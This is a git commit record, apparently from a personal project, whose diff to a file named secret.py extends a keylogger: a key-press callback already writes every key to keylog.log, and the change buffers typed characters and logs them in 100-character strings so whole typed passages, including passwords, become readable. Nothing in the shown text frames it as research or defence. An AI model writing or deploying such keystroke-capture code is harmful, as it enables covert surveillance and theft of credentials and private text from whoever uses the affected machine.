e5f39b36fee92c4b0507db4c43a34aa9a8dcc358
Stephen <ssjohnson1990@gmail.com>
2018-10-15 17:52:38 -0400

    Working on logging

--- secret.py
+++ secret.py
@@ -4,8 +4,15 @@ import logging
 log_file = "keylog.log"
 logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s : %(message)s')
 
+key_press_data = ""
+
 def on_press(key):
     try: 
+        global key_press_data
+        key_press_data += key.char
+        if(len(key_press_data) == 100):
+            logging.info('String: {0}'.format(key_press_data))
+            key_press_data=""
         logging.info('Key {0} pressed'.format(key.char))
     except:
         logging.info('special key {0} pressed'.format(key))
